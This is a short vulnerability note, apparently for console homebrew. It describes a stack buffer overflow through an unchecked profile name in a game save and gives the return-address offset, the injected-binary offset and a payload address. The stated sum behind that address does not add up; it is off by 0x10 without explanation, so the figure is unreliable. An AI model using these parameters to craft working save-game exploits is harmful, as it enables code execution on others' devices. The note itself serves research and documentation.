Vulnerability: Stack Buffer Overflow via Profile name
The profile name is limited to 10 bytes, but the string length/size is unchecked. Using an excessive long profile name will cause a stack smash and overwrite the return addres (known as $ra)


0xB0 = $ra control offset in save game
0xC0 = Location of the injected binary
0x08800000 + 0x008F5190 = 0x090F51A0: payload address [A0 51 0F 09]
